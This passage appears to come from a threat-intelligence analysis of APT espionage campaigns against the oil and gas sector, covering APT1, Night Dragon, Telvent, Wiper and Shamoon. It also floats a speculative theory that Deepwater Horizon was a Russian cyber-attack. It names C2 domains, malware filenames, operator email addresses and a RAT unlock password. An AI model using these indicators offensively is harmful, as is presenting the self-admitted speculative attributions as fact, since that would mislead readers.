With that said , there is another somewhat tenuous connection between two of the campaigns : Mirage and Elderwood .
Night Dragon is not the only instance where an individual in China is charged with providing infrastructure to the attackers via their business – HB Gary authored a report in the wake of Operation Aurora which implicated a business called Bentium operating 3322.org out of Changzhou and a man named Peng Yong as providing dynamic DNS services to the attackers .
Operation Aurora was tied to Elderwood in Symantec 's Elderwood Project report and elsewhere .
Dell Secureworks which authored the Mirage Report also authored a piece known as the Sin Digoo Affair .
The connecting factor between the Sin Digoo affair and Mirage was that an operator reused several email addresses ( jeno_1980 @ hotmail.com & king_public @ hotmail.com ) and infrastructure between them .
The C2 servers used a Dynamic DNS service operated by 3322.org .
The Sin Digoo Affair also ties these back to Gh0stNet via 3322.org and the RSA breach based on the reuse of IP address blocks belonging to the `` China Beijing Province Network ( AS4808 ) .
'' Peng Yong also owns other domains tied back to malicious use both in Aurora and elsewhere .
According to Steve Ragan of the Tech Herald , Peng Yong is possibly the author of the CRC function used in some of the Aurora malware .
It is entirely possible that 3322.org was providing services to multiple separate APT groups , it is after all a fairly successfully Dynamic DNS service which has been documented in other malware cases .
However , Peng 's level of involvement in the Aurora campaign should be scrutinized .
Interestingly the Sin Digoo report also attempts to identify the jeno_1980 account which had the alias `` Tawnya Grilith '' attached to it .
In the process of their investigation , they tied back the account to an operator going by the screen name `` xxgchappy .
'' They also found a piece of malware ostensibly written by xxgc happy appearing to date back to March of 2002 .
This is potentially significant because it is the time frame around which the leaked US embassy cable had noted possible PLA cyber espionage activity .
Malware used by this actor , as well as appearing in Mirage and Gh0stNet , was discovered in 2011 and 2012 to have infected government ministries in Vietnam , Brunei , and Myanmar .
Additionally there are a few infected victims in Europe and the Middle East belonging to `` government ministries in different countries , an embassy , a nuclear safety agency , and other business - related groups .
'' This is of interest in part because Red October also targeted government ministries and embassies .
However , in order to more fully analyze any connections between the domains that were listed in each of the reports , the whois and ARIN records could be examined .
The contact information could then be cross - referenced to find similarities .
Unfortunately , many of the domains had their contact information scrubbed or have since changed hands in the wake of the reports being released , so an analysis at this point would be erroneous and incomplete at best .
A final note on domains is that many of the reports did look for registrant information – in the case of APT1 for instance , many registrants blatantly put China as their place of origin , or poorly masked this fact by misspelling the places they chose or including a Shanghai phone number .
In the case of Red October however , all registrations with the exception of one were done with `` .ru
'' email addresses , and addresses were not reused as had been the case in other instances .
This signals a much more concerted effort to remain anonymous , and a level of professionalism not seen in the other attacks .
Considering the information which was discussed and presented , below is a revised attack timeline , consolidating individual campaigns into the likely perpetrator of the attack and extending as necessary .
Using the technical data and behavioral analysis above , individual incidents of reported hacking in news media can be connected to campaigns .
Below are several incidents that demonstrate strong correlation to the information discussed above .
Norway had the most prolific series of cyber - attacks in the country 's history in November 2011 .
As reported by Norway 's National Security Agency ( NSM ) , more than 10 firms were targeted by an advanced persistent threat using spear - fishing attacks , many of which were in the oil industry .
The attacks may have been ongoing for over a year .
The companies were unaware of the attacks until concerned employees reported receiving suspicious emails .
No specific information was released on the tools or malware that were used to conduct these attacks ; however NSM noted that a virus was used in conjunction with tailored spear - fishing attacks making use of trojan attachments .
It appeared that the purpose of the attacks was large - scale data exfiltration .
As was the case in Night Dragon , the NSM bulletin suggests that the attacks varied slightly each time so as to avoid AV detection .
An article by Defense News quotes NSM as stating that `` the attacks have , on several occasions , come when the companies have been involved in large - scale contract negotiations .
'' This could suggest that the attackers were privy to the negotiations .
Interestingly , in 2010 Norway 's Statoil was engaged in negotiations with China Oilfield Services , Ltd. ( COSL ) .
According to the Wall Street Journal , COSL is the `` oil - field services and rig - construction unit of state - controlled China National Offshore Oil Corp. , the country 's largest offshore oil and gas company by output .
'' The goal of the attacks appeared to be the collection of confidential information , such as user names , passwords , industrial drawings , and other proprietary documents .
This would seem to be consistent with the types of information sought in both Night Dragon and APT1 .
The timeframe of the attack aligns with the event timeline listed in the APT1 report , and within the report there is an event appearing in Norway .
This is then a convergence of time and objectives across these operations which complement the tactical similarities involving the use of social engineering , persistent backdoors , and large scale data exfiltration .
In September 2012 Canadian energy company Telvent was infiltrated .
Telvent is responsible for supplying control programs and systems for over half of the oil and gas pipelines in North and Latin America .
The attackers installed malware which they used to steal project files related to Telvent 's OASyS SCADA product .
According to security blogger Brian Krebbs , OASyS is `` a product that helps energy firms mesh older IT assets with more advanced ' smart grid ' technologies .
'' The infiltration follows the same methodical approach exhibited in the Night Dragon and Norwegian intrusions .
Not only was the malware difficult to detect , but it was planted using spear - phishing methods that targeted mid to high level executives .
Perhaps the most convincing piece of evidence as to the origins of the attack is what appears to be a notification released by Telvent which identified malicious files and domains used for Command and Control ( C2 ) .
The filenames `` fxsst.dll '' and `` ntshrui.dll '' which appear in the Telvent notification also appear in the APT1 report , along with the domains `` hugesoft.org '' and `` bigish.net '' which are noted as mainstays of APT1 by Mandiant .
Several security firms at the time also reported the belief that the attack had been perpetrated by the `` comment group '' an alias in the Mandiant Report for APT1 .
In fact , Mandiant actually mentioned the Telvent attack in their report under a section entitled `` APT1 in the News .
'' The reason the Telvent attack is so important is that it represents the possibility for departure from simply data exfiltration .
Although available information indicates that the goal of the attack was stealing software , the software could just have easily been modified and replaced .
Attacking a prolific energy ICS company like Telvent means that a trojan could be planted in the software , being unintentionally distributed to Telvent 's customers and offering the perpetrator an avenue for more insidious attacks .
Perhaps the most readily apparent attribution is to China as a state actor – the APT1 report makes a convincing argument for this which offers a lot of very well constructed circumstantial evidence .
Night Dragon highlights the use of a RAT known as zwSheel which was used both as a to perform C2 and to create custom trojans .
Interestingly , upon launch zwShell displays an error dialog with a hidden text field and the program will not function unless the password ' zw.china ' is entered into this hidden text field .
The ranges of consecutive IP addresses used were large enough that it is likely that the Chinese government had to be involved in some capacity .
China certainly possesses the motive to commit the attacks – according to the Washington Times , China is already surpassing the United States as the number one oil importer from the Middle East , and poised to become the number one oil importer globally .
Chinese demand for oil has grown dramatically as its economy continues to expand .
Since the mid-1990s , China has been a net importer of oil .
The continuous growth of the Chinese economy has resulted in vast increases in the need for fuel and petro products .
China has doubled its oil consumption in the last 10 years and become the second largest consumer of oil in the world behind the U.S. Like the U.S. , China is now dependent on its oil imports to feed its thriving economy .
It is estimated that China 's import dependency could rise to over 50 % by 2020 .
China 's oil refineries are not capable of handling the current demand the economy is placing on them .
There is evidence that the refineries used for fuel are at a competitive disadvantage when compared to other countries .
To complicate matters , many Chinese oil refineries are also oriented to the making of diesel and not gasoline , which is in increasing demand .
This means China is in great need of more sources of oil and more efficient refineries .
The development of improved refining and mining equipment takes years and can cost millions of dollars .
Exploration costs for finding new oil reserves have almost tripled in the past decade .
They could save billions of dollars and shave years of research off by acquiring technology from petrochemical corporations that are already heavily invested in this continuing process .
It also means that China would be able to compete in the global market place much sooner and more competitively than if they waited to develop the technology on their own .
This establishes that there are significant reasons for China to act on behalf of its own oil industry and use its state resources to conduct cyber - attacks against corporate entities worldwide .
As seen in the chart above , China experienced a significant increase in oil production during 2009 .
This spike in production could be due to information that China gained from US firms through cyber espionage actions , such as Night Dragon .
The Night Dragon attacks were believed to have begun circa 2007 .
According to Kirk , information taken during these attacks includes market intelligence reports and information on operational production systems .
Similarly , the Mandiant report shows that the APT1 group has monitored Mandiant 's energy industry customers from approximately the beginning of 2009 to 2012 .
During these attacks , APT1 would export terabytes of data from the victims to China .
In tandem with these revelations , China 's also aggressively pursued oil supply contracts during 2009 .
During this time major Chinese state oil companies acquired holdings in 18 different countries .
China is determined to take on oil and gas infrastructure development and to acquire oil industry assets .
Although there is evidence that China has been conducting cyber espionage activities against oil industry targets as far back as 2007 , there is only trivial growth until 2009 .
This could be a result of the time and recourse commitment required to process the data that was acquired .
As mentioned , both the Night Dragon and APT1 attacks stole an enormous amount of data from English speaking companies .
It is necessary for English - fluent operators to sift through this data and extract actionable information to report .
This information would also need to be provided to experts in the field who could recognize the its vale , and that process would have to be done discreetly so as not to arouse suspicions .
This would take time .
The Mandiant report comments on the fact that there are limited English - fluent operators directly involved in the technical end of APT1 , which would significantly hinder progress .
Considering these factors and the timeframe for growth presented above , it is conceivable that the information and strategy for its use would not be available until 2009 .
At this point , China could act to increase the output of the holdings that they currently owned .
Also , the information gained from market intelligence reports and possibly exploration reports could guide the state companies in deciding which new holdings to purchase during this time period .
The new holdings would allow for increased output overall .
China 's fervor for oil acquisition has not been limited to aggressive increases in holdings and contracts .
These activities are likely only one piece of a global strategy to secure China 's future oil requirements , including reserves that may not be productive today or in the immediate future .
This overarching strategy has apparently led to a pattern of quiet investment , which may be a direct cause for concern in America .
An article appearing in the Associated Press discusses these Chinese investments in Venezuela , the country with the largest proven oil reserves as of 2011 , and throughout the Caribbean and South America .
The article notes that `` when Venezuela seized billions of dollars in assets from Exxon Mobil and other foreign companies , Chinese state banks and investors did n't blink .
Over the past five years they have loaned Venezuela more than $ 35 billion .
'' They have similarly provided aid to countries like Ecuador , another country within the top 20 of proven oil reserves .
In some cases it appears that the Chinese are making loans that the countries will likely be incapable of repaying , placing them squarely within China 's control .
Many of the deals included `` repayment in oil and natural gas '' and billions of dollars have been loaned directly to energy companies in Russia and Turkmenistan , both of which have been targeted in cyber espionage campaigns and are in the top 5 for proven natural gas reserves .
Although the IEA has predicted that America is moving towards energy independence and is poised to become the number one oil exporter by 2017 , the loans are breeding closeness with and reliance on China by countries in close proximity to the US .
This could allow for the Chinese to weaken American influence in the region and create agitation against the US or between other countries within the region in order to distract the US from its goals in other areas strategic to the Chinese .
These deals also place China in the supply chain for borrowers ' projects where China has insisted on Chinese companies being involved as a stipulation of the loan .
These loans have not required any economic reforms to accompany them , meaning that countries which could not secure a loan from the IMF due to poor financial decisions may continue to flounder in spite of aid , perhaps even more so because of it .
In the worst case scenario , these countries become unstable .
While this may cause issues to the Chinese in some logistical capacities , it would also serve to divert some of America 's attention , making the situation a palatable outcome for China .
An analysis of these events would be remiss without exploring any other possible attribution .
Though unlikely , it is possible that there were other actors involved .
As pointed out by Eugene Kaspersky in his criticism of the Shady RAT report , some of the tools and techniques are generic enough to not lend themselves to attribution to a particular entity .
Even the ones that are of Chinese origin do not of themselves implicate the Chinese government , only an actor familiar with how the tool works or minimally trained in Mandarin .
A large portion of these tools were freely available on underground Chinese hacking sites .
Chinese hacking collectives or corporations may have been independently involved .
However , due to the suspicions voiced in the leaked diplomatic cables suggesting PLA involvement and Mandiant 's research on the topic indicating the same , it is highly unlikely that the Chinese government was not involved whatsoever .
These sources , and the timeframe in which the attacks occurred -- between roughly 9 am and 5 pm consistently over a protracted period of time -- is indicative of a formalization of the activity .
This is further evidenced by the resources required to carry out the attack and the Chinese government 's grasps on censorship of their citizens through technical controls .
Terabytes of data infiltrating the country is unlikely to have been missed , particularly over the course of a decade of activity .
If China had been involved in any capacity in cyber espionage attacks and this had been discovered by another entity , said entity might have leveraged this knowledge to collude with them either through coercion , cooperation , or clandestinely without the Chinese government knowing .
Though this may seem farfetched , a report released by a Luxemburg security firm details how , in the wake of Mandiant 's APT1 report , they decided to engage in an intelligence gathering operation on the APT groups operating out of China .
By scanning Chinese IP ranges for C2 servers known to be used in the APT1 attacks and exploiting weaknesses in the attackers ' C2 infrastructure , they were able to access , monitor , and control the APT infrastructure without the adversary 's knowledge .
Bloomberg also hinted at the possibility of American security firms acting in a similar way when they `` exploit [ ed ] a hole in the hackers ' security … logging the intruders ' every move as they crept into networks ...
'' Knowing that the Chinese were actively engaged in such operations and likely turning a blind eye to any infiltration of data , another actor operating through China and attempting to incriminate China could have engaged in cyber espionage as well .
This is truly a stretch of the imagination , and there is no evidence whatsoever to support this theory .
The most likely case for any attribution involves the Chinese government in some capacity .
The most important takeaway from these incidents is the significance they hold to the future of the Oil & Gas industry .
Inexorably , Oil and Gas is intertwined with the Cyber domain , and will only continue to become more so as the time progresses .
The increased reliance on technology means that more and more data and control will be accessible to the attackers in the future .
A large contingent of the attacks relied on social engineering and spear phishing as a point of entry , though there is a shift toward `` watering hole '' attacks .
This is significant because even as technical controls get better , unwitting employees and their behavior will continue to be a focal point in targeted attacks .
Automation via SCADA / ICS has been an integral part of the Oil industry 's past and will be even more so in the future .
Attacks like the Telvent attack herald an insidious turn of events for SCADA within Oil & Gas .
The attackers seemed intent on stealing SCADA software , but it is conceivable that they could have taken such an opportunity to embed their own code within it , providing a capability to manipulate large swaths of North American pipeline at will .
This is not meant to be alarmist , but rather considers the next evolution of attack .
Leveraging malicious SCADA software to achieve a kinetic outcome is not the baseline going forward , but it is well within the realm of possibility .
The nature of a capability like this means that it can only be leveraged to catastrophic effect once , so the possibility of an entity using it outside of sustained or ardent conflict is low .
However using this on a micro - scale , and degrading service or quality of service through manipulation of malicious software on the PLCs or HMIs could be more viable in a peacetime setting , and less noticeable .
This type of activity could be used at the height of negotiations or disputes to put an adversary in a compromising position , or simply distract them .
The Cyber - warfare doctrine of large nation - states like China and Russia that have a huge stake in the Oil & Gas Industries is one of perpetual conflict .
Timothy Thomas discusses this in his books Recasting the Red Star and The Dragon 's Quantum Leap .
The idea of an `` active defense '' and keeping potential competitors `` off balance '' is the posture going forward .
The concept of peace being a time without conflict is rapidly disappearing .
As globalization has become the status quo and global economies become ever more entangled , threat of a large - scale kinetic confrontation between top tier economic powerhouses is nearly strategically unviable .
Instead , both state and non - state actors will use constant conflict in the Cyber realm as a method for accruing resources and exercising control .
While cyber conflict often brings to mind the idea of SCADA initiated pipeline explosions , the theft of intellectual property and business communications is far more likely to continue .
This type of low intensity conflict is cost - effective and politically sustainable in an environment where direct attribution is at times difficult .
The idea of a constant or long term `` ally '' or `` strategic partner '' is no longer valid – coordination will be largely issue specific , and only to the extent required to achieve an end .
While coordinating on one topic nations will be in conflict on another .
This is not in any way a revolutionary or new idea ; however it is becoming more and more relevant to salient industries operating within their own nation state and abroad as they become far more accessible and targetable in this type of conflict .
Non - state actors will play a huge role in future cyber conflict within the oil and gas industry .
The Norway attack which coincided with a meeting by a state - backed Oil & Gas company may suggest that they already are playing a role .
Certainly Antivirus & Incident Response companies are playing a role as non - state actors by releasing these reports .
But aside from cooperation with Sate actors , non - state actors may operate independently against other non - state actors in pursuit of competitive advantage or sabotage .
Hacker collectives like anonymous could have an out - sized impact if more highly organized , and the attacks they have already carried out could become more severe – instead of simply releasing email addresses , they could release bid data , or attempt something more destructive akin to a Shamoon type attack .
The release of reports on APT is in a way its own form of cyber conflict ; the rhetoric of these reports is an information influence operation , both targeted at potential customers and at adversaries .
These reports also allow adversaries to see how they were detected and correct mistakes going forward .
It is likely that future attacks will lack the types of unprofessional mistakes made during these campaigns .
The embedding of personal signatures ( a la Ugly Gorilla ) or the use of passwords like `` zw.china '' will diminish significantly .
If an attacker wished to be more anonymous , it would start to transition to open - source and generic tools exclusively – tools which are common enough that they do not provide significant attribution .
Tools like the Metasploit framework provide a high degree of extensibility without offering a significant amount in the way of attribution by tool choice .
If not a transition like this , then using tools stolen from other attackers or written in other languages would complicate attribution .
The move within the Information Technology world toward more forensically resistant technologies such as SSDs and Cloud Service infrastructures which make attribution and legal jurisdiction much more convoluted will continue to be a catalyst for future attacks alongside services already in use like Dynamic DNS .
These cyber espionage attacks are likely the newly established baseline for future cyber conflict within the Oil & Gas Industry .
Attacks of this nature and magnitude will continue to originate from places which do not have laws against it or are complicit , including China which has a need to secure oil dominance in the future .
However , increasing international pressure will necessitate more covert action , with attackers dispersing their operators or proxies throughout large geographic areas .
Non - state actors will likely present APT threats in the future , including State - backed and independent competitors .
Another series of events may be connected as well , and while they bear no immediately apparent relationship , closer inspection is suggestive of the possibility of another underlying and ongoing conflict .
To understand the context of the exchange , a non - oil - related cyber event must be briefly discussed .
A relatively unprecedented cyber - attack came to light in 2010 when the Stuxnet virus hit the uranium enrichment centrifuges in Iran .
Iran believes the attack was conducted by Israel or the United States .
This attack had targeted the information networks of offshore platforms ; however they reported that they were able to defend against the attack .
Iran may have thought it was Israel because they had threatened to take military action if the sanctions on Tehran 's banking and oil sectors did not stop Iran from continuing their nuclear program .
The attacks targeted Iran 's infrastructure and communications companies , which slowed the Internet in Iran .
Israel and the United States have denied being a part of this attack .
Then In April of 2012 , Iran was again the target of a cyber - attack .
The Islamic republic reported that a computer virus was detected inside the control systems of Kharg Island , which controls Iran 's crude oil exports .
This virus began to attack several of the main Persian Gulf oil terminals in Iran , which forced the Iranian officials to disconnect them from the Internet to avoid spreading the virus .
This virus , known as Wiper , successfully erased information from hard disks at the Oil Ministry 's headquarters in Tehran .
The headquarters had apparently been the initial target of the virus .
Oil Ministry officials reported that the international selling division had not been infected , but it many security vulnerabilities were exposed .
Iran is one of the world 's largest oil producers and an attack could affect the market , and raise oil prices globally .
As with the Stuxnet worm , Iran blamed Israel and the United States for the spread of Wiper .
Iranian officials believe they were targeted because of their growing nuclear program .
Other affected organizations include the National Iranian Oil Processing and Distribution Company , National Iranian Gas Company , Iranian Offshore Oil Company , Pars Oil and Gas , and other companies controlled by the National Iranian Oil Company .
The destruction of this data does n't provide much in the way of direct monetary gain for any criminal elements .
The real advantage gained by unleashing Wiper is to put pressure on Iran by causing economic loss and reminding them that they are vulnerable .
The president of the Tehran World Trade Center , Mohammad Reza Sabzalipour , believes the cyber - attack was indeed a direct message .
The aim was to increase pressure so that Iran will compromise in the upcoming nuclear talks on May 23 , 2012 .
He later states , `` We are in a bloodless war .
If the talks fail , Iran can expect much more of this '' .
An oil embargo in concert with other economic sanctions by the United States and EU was announced in late 2011 in an effort to discourage any further Iranian nuclear activity .
In March of 2012 , the Obama administration announced that the market could withstand the embargo of Iranian oil , and raised US - Iran tensions over the issue .
Saudi Arabia had also indicated that it would boost oil exports to the US and abroad to compensate for the void that would be left by the sanctions on Iran .
As the fifth largest oil producer in the world , the Iranian oil industry accounts for about 20 percent of Iran 's GDP .
Both the embargo and the virus represent serious and direct concerns for the Iranian government .
Then in August of 2012 , only four months after the embargo , a virus named Shamoon struck Saudi Arabian oil giant Aramco .
The virus was triggered on a Muslim holiday when most of the company 's employees were absent from work .
Shamoon was designed to replace data on hard drives with a picture of a burning American flag and report the address of the computer back to a separate computer inside the company network .
This is potentially significant because Aramco is the world 's largest producer of oil , and was originally a joint effort with the United States ( Arabian American Oil Company ) .
, Additionally , Shamoon contained a function called `` Wiper '' which was responsible for the deleting of files .
The name `` Wiper '' and the shared functionality of the two are somewhat suggestive .
Interestingly , a previously unheard of `` hacktivist '' group identifying themselves as `` The Cutting Sword of Justice '' took credit for the attack and not a nation state .
They claim the virus has given them access to documents on Aramco 's computers , but none have been published yet .
The attack was believed to have been assisted by an insider at the company .
Another note of significance about Shamoon is that the text `` Arabian Gulf '' was found in the code which is pertinent because Iran has zealously guarded the title of the region as the `` Persian Gulf .
'' Although Wiper and Shamoon share a few common characteristics , they are significantly different .
Both viruses have been analyzed by Kaspersky Labs who has concluded that although Shamoon contains a wiper function that is designed to overwrite data , it is not as well - designed as Wiper and not near as efficient .
The care that was taken by whoever made Wiper to insure it did as much damage as possible in the shortest amount of time is what differentiates it from Shamoon 's wiping feature .
Since wiping a disk with hundreds of gigabytes of storage can take an extremely long time , Wiper was designed to target files with certain extensions or in certain folders to do as much irreparable damage as fast as possible .
Kaspersky claims that Shamoon was merely a copycat virus that was `` the work of script kiddies inspired by the story .
'' They also claim that Shamoon was probably the work of a non - state group and that Wiper was most likely the product of a nation - state .
Even though Shamoon was not on the same level as Wiper , it is still an impressive piece of malware that was able to do damage to important systems .
Whether it was the unimpressive work of a nation - state or the work of a skilled group of non - state actors , it made an impact and had an effect on Saudi Aramco .
These insights raise the question of whether or not this was an isolated attack by a non - state actor , or whether it was one in an ongoing series of salvos between the Iran and US cyber communities .
Iran certainly possessed the motive – retribution for sanctions levied against it , and the cooperation by Saudi Arabia , a Sunni Muslim nation which has been at odds with Shiite Iran before .
Typically , however , in an act of retribution the attacker invites attribution which Iran did not .
Also , despite causing destructive action to the data on the computers , the virus did not attack the actual control systems and as a result did not manage to damage oil production .
The relative crudeness of the code and use of the term `` Arabian Gulf '' in concert with the insider knowledge of the hacktivist group `` The Cutting Sword of Justice '' and the use of an Aramco insider to facilitate the attack could suggest that it was simply a singular attack by a non - state actor .
Iran 's doctrine is one of asymmetric and proxy warfare .
It has been suggested that Iran used unofficial hacker groups such as the `` Iranian Cyber Army '' to both defend against and engage in attacks .
It is possible that `` Arabian Gulf '' was a red herring intended to further obscure the origin of Shamoon .
Using a proxy to launch an attack aligns with Iran 's strategic culture but the exact author is not known .
It is possible that Iran did not wish to engage in direct conflict , but intended to make the sanctions less viable by ensuring Aramco would be unable to supply the necessary volume of oil .
If this were the case then the attack would show a severe flaw in Iran 's understanding of the oil production systems by not attacking the control systems , instead , which should be unlikely due to Iran 's own expertise in oil production ; or it may have been intended to send a message advertising the capability while not crossing a direct line by inflicting significant infrastructure damage .
This , however , is pure speculation and not empirically derived analysis .
If Iran did in fact orchestrate the Shamoon attack , it would suggest that the series of attacks on Iranian critical infrastructure were followed by retaliation on the American oil supply chain .
This would indicate an ongoing and escalating conflict that should be cause for concern .
One incident which appears on the list is singular in that unlike the other noted events it does not appear to be the result of a direct cyber - attack : the Deepwater Horizon oil spill .
On April 20th , the culmination of severe neglect of safety protocols and a slew of design and implementation flaws incurred the worst environmental disaster in US history .
While drilling the Macondo well in the Gulf of Mexico , the Deepwater Horizon oil rig had a `` blowout '' in which an uncontrolled mixture of mud and gas was released after failure of pressure control systems .
The gas spread across the rig and is believed to have first ignited in the engine room , initiating several explosions and causing the rig to eventually be engulfed in flames and sink .
The reason the `` Deepwater Horizon '' event appears on a list of `` cyber - related oil industry events '' is because , regardless of the cause , the incident had several failures in networked control and safety systems which could have prevented the catastrophe from occurring after the blowout .
The former chief electronics technician on the rig , Michael Williams , noted during testimony before a government panel that the alarms which would notify the crew of a gas situation was placed in an `` inhibited '' mode for over a year because `` they did not want people woke up at 3 o'clock in the morning due to false alarms [ sic ] .
'' Additionally , other monitoring and control systems intermittently froze , and a fire and alarm system was set to `` override active .
'' Despite a series of four tests conducted in the hours before the incident to ascertain that the integrity of the well , no alarms were sounded or reported directly before the incident .
These control issues solidify the idea that there was a cyber - component to the catastrophe .
When taken into the context of other events which occur in and around the same time period , it becomes clear that though there is no direct evidence pointing to a malign threat actor 's involvement , such an attack is technically viable .
It is incredibly unlikely that any state or non - state actor was involved in an attack on the Deepwater Horizon ; however the circumstances preclude the exclusion of this possibility , remote though it may be .
The Blowout Preventer ( BOP ) was recovered and forensically examined , but most other evidence can not be examined – it has either ceased to exist or is inaccessible .
The destructive nature of the accident and the apparent corporate neglect makes collecting any cyber - forensic evidence linking the incident to an actor infeasible .
Most evidence is destroyed , unusable , or largely inaccessible at the bottom of the ocean .
It is likely that any control system audit reports or logs capable of providing insight either would not have attributed anomalous activity to an unidentified APT , or would not be comprehensive enough to provide evidence that could retroactively suggest an APT .
The audit logs themselves are dubious due to allegations that Transocean and BP were hastily rushing procedures because of large scheduling overruns .
Further allegations have surfaced against BP employees and contractors accusing them of destroying evidence in the wake of the disaster .
Bearing in mind that there is no direct or forensically sound evidence and that only circumstantial evidence is available , the vignette which will now be explored is the use case of the Deepwater Horizon incident as a cyber - attack .
Several events that have occurred both before and since the BP oil spill suggest that an attack would be technically feasible .
According to an article attributed to Dorothy E. Denning , a professor of computer science at Georgetown University , in 1992 a disgruntled former employee of Chevron intentionally disabled alarm systems at Chevron 's oil refineries for 10 hours by `` hacking into computers in New York and San José , California .
'' While this only affected on - shore refineries and is dated enough that technical controls may have improved since then , another attack in 2009 showed that control systems on off - shore rigs may be also disabled remotely .
Mario Azar , a disgruntled contractor formerly working for Pacific Energy Resources , sabotaged an offshore oil rig `` computer system that PER used to communicate between its offices and its oil platforms .
The computer system also served a ' leak detection ' function for PER .
'' The systems were disabled from May 8th until June 29th before it was noticed .
And as recently as February 23rd 2013 an article in the Huston Chronicle stated that `` Malicious software unintentionally downloaded by offshore oil workers has incapacitated computer networks on some rigs and platforms , exposing gaps in security that could pose serious risks to people and the environment .
'' These articles would seem to state that a cyber - attack on an off - shore rig is not only possible , but a reality .
Complicated control system attacks such as Stuxnet have already proven that even in conditions where network access is unavailable , intelligent viruses can still perform a predetermined function at a designated time .
By extension of these occurances , it may be concluded that a capable attacker could manipulate safety control systems of an oil rig from shore , and do so through a sophisticated control system virus which can operate even when not in contact with a C2 server .
If it is assumed that Deepwater Horizon was an attack , it gives rise to the question of attribution .
In order to attribute an attack for which there is no direct or forensic evidence , one must instead turn to political attribution .
This includes considering which actors had the motive , means , and the opportunity to perform the attack .
Motives can in part be divined through observation of the direct and indirect outcomes of the event and its beneficiaries .
After narrowing the scope of actors , one may then examine the policies , strategic culture , operations , and tactics of relevant actors against different dimensions of the event to reveal alignment or correlation .
Immediate and direct impacts of the Deepwater Horizon oil spill were as follows : - A moratorium on any drilling in the Gulf of Mexico for the ensuing 6 months - The Macondo well becoming unusable , at least in the immediate - Ecological disaster in the United States and other GoM adjacent countries - Heavy political damage , fines , and charges levied against both BP and contractors such as Transocean , Ltd. BP has been by far the biggest figure attached to the incident .
As of March 2013 BP has been forced to spend or provision $ 40 Billion as a result of Deepwater Horizon .
To put this in perspective , BP 's combined profits for the years of 2010 - 2012 amount to about $ 34.6 billion .
These impacts in and of themselves are notable , but they also created a ripple effect of indirect consequences as well .
These indirect outcomes include the possible fluctuation in oil and gas prices and potential for geopolitical fallout from the ecological disaster .
Additionally though , and perhaps most significantly , in 2011 BP announced a $ 38 billion asset divestment program in order to cover the costs of the enormous fines incurred by the Deepwater Horizon spill .
So what did BP divest , and to whom ? This data would suggest that one of the main beneficiaries of the oil spill is Rosneft , a state - owned oil company belonging to a state actor which possesses both a cyber - capability and vested interest in the oil industry .
It is the only one of the top five oil producing countries yet to be mentioned : the Russian Federation .
In July of 2012 Forbes released an article on the World 's largest oil companies .
What was notable about the article was this quote : `` But when sorting through the rankings of the World 's 25 Biggest Oil Companies and looking at who controls and influences the biggest of big oil one thing becomes clear : no industry leader has more sway , has twisted more arms or made more deals than Russian President Vladimir Putin .
'' The article goes on to point out the Russian President 's past use of Gazprom - the state - run oil giant and second largest producer in the world - as a political tool and his vast influence over other non - Russian oil companies .
Russia , an acknowledged force in cyber and the second largest exporter of oil in the world , is markedly absent in the last decade from the master timeline either as an aggressor or as a target , barring of a few leaked emails by the Anonymous hacking group .
This appears aberrant , even despite the possible language barrier mentioned at the beginning of this report or Russia 's tightly controlled dissemination of information .
While clearly the Russian Federation was the largest beneficiary of BP 's post - spill divestments and also benefited from a halt in Gulf of Mexico oil production , the question that remains is whether or not the possible acquisition of TNK - BP ( which would be difficult to predict ) is motivation enough to engage in a risky enterprise such as a cyber - attack that results in a kinetic outcome - particularly when weighed against the possibility of direct attribution that could have far reaching implications to relations with both the UK and the US .
If these benefits alone are not enough , then what other motivators existed which , in concert , would have been cause for Russia to launch a cyber - attack on a UK company operating in the Gulf of Mexico ? In order to properly answer these questions many factors need to be examined , including : - the extent of BP - Russian relations leading up to and beyond the Deepwater Horizon incident - Geopolitical considerations of the time - Any competition in market - share between BP and Russian state - controlled oil companies - Russia 's overall relation to and dependence on the oil industry - Russia 's strategic goals at the time - A high - level understanding of the Russian approach to cyber warfare An interesting relationship between Russia and BP has unfolded over the past decade , revealing a series of exchanges that highlight a tenuous co - existence .
The figure below displays this in detail , aligned with geopolitical events .
The exchange begins in 2006 when the Russian state - run gas company Rosneft went public on the London stock exchange and BP purchased 1 billion in shares .
This is a seemingly straightforward strategic partnering ; however there was speculation that BP was `` pressured into investing in order to secure future oil exploration rights for its own Russian joint TNK - BP .
'' Robert Amsterdam , a layer for the former head of Yukos ( an oil company absorbed by Rosneft ) , was quoted as saying that BP `` has a gun held to its head .
'' Then in June 2007 , The Russian government pressures BP to sell one of the world 's largest natural gas fields to state - run Gazprom or lose the license to develop it .
2008 presented perhaps the height of tensions when armed police raided BP - TNK 's Moscow offices in what appeared to be an effort to intimidate shareholders .
This came on the heels of speculation that Russia wished to `` buy out the shareholders of TNK - BP as part of its campaign to tighten control of the country 's energy assets .
'' In a related vein , the BP - TNK CEO was forced to leave the country after Russian authorities refused to renew his visa .
Also in 2008 , an important BP incident which did not appear to directly involve Russia occurred .
Off the coast of Azerbaijan at the Central Azeri platform in the Caspian Sea , one of BP 's off - shore rigs suffered a blowout nearly identical to that of the Deepwater Horizon .
The gas did not ignite , and no one was killed , however it did cost around $ 50 Million a day in losses for the Azeri government .
BP purposefully kept all details of the incident under close wraps verging on a cover - up .
Then the Deepwater Horizon event occurs in 2010 , followed by the sale of TNK - BP to Russian state - run Rosneft in 2012 as part of the asset divestment program initiated to pay for the spill .
In that deal , BP also purchased shares in Rosneft , upping their stake from 1.25 % to 20 % and receiving two seats on the board of directors , including one which was awarded to BP 's current CEO Robert Dudley - the same gentleman who was forced to flee in 2008 over an un - renewed visa .
However , according to a Reuter 's article published on March 4th of this year `` … as a state appointee , Dudley would have to vote by government directive on major issues , such as large deals and key appointments .
'' This remark is in contrast to another individual who had `` been nominated as an independent and as such can decide for himself how to vote .
'' These Russia - BP relations coincide with an amalgam of geopolitical events not directly related to BP , but offering supporting context for eventual conclusions drawn about the Deepwater Horizon oil spill .
Following the collapse of the Soviet Union in 1991 , many of the state owned oil and gas assets were sold at significantly discounted values to private individuals creating an economic void for a fragile new country already plagued by monetary issues in other sectors .
Russia faltered economically for most of the 1990 's until Vladimir Putin was elected President in 2000 under a banner of planned economic prosperity .
Putin is an interesting figure , and has played prominently in Russia 's return to the world stage .
A former KGB member , Putin has sought the consolidation and reclaim of critical sectors of the Russian economy , most notably the energy sector .
Using strong - arm tactics and political pressure , he has set the tone for Russia 's future policy .
In 2006 , Russia temporarily turned off the gas it was supplying to the Ukraine , inciting conflict and unrest with other European countries .
The move was cast as an overt attempt to regulate natural resource prices for a market in which Russia controls production and reaps profits from a customer base with limited alternate supply .
